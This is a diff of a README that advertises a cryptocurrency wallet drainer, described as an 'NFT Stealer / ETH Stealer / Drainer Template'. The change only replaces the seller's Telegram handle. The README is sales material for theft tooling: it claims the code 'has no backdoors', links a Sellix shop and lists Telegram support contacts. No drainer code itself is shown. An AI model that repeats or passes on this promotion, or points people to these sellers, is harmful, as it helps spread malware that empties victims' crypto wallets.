@@ -1,5 +1,5 @@
 # ***⛔ This Code Has No Backdoors!***
-### If you need any help, DM me here: [@draingold](https://t.me/draingold)
+### If you need any help, DM me here: [@crypto_scem](https://t.me/crypto_scem)
 
 ## 🖼️ NFT Stealer / ETH Stealer / Drainer Template / ETH Drainer / NFT Drainer
 
@@ -24,7 +24,7 @@ To get instant support, contact me on [@draingold](https://t.me/draingold)
 
 ## `⭐ Socials :`
 
-- Telegram: [@draingold](https://t.me/draingold)
+- Telegram: [@crypto_scem](https://t.me/crypto_scem)
 - Shop: https://tecdrainers.sellix.io
 
 ##### Please ⭐ the repo to support our project
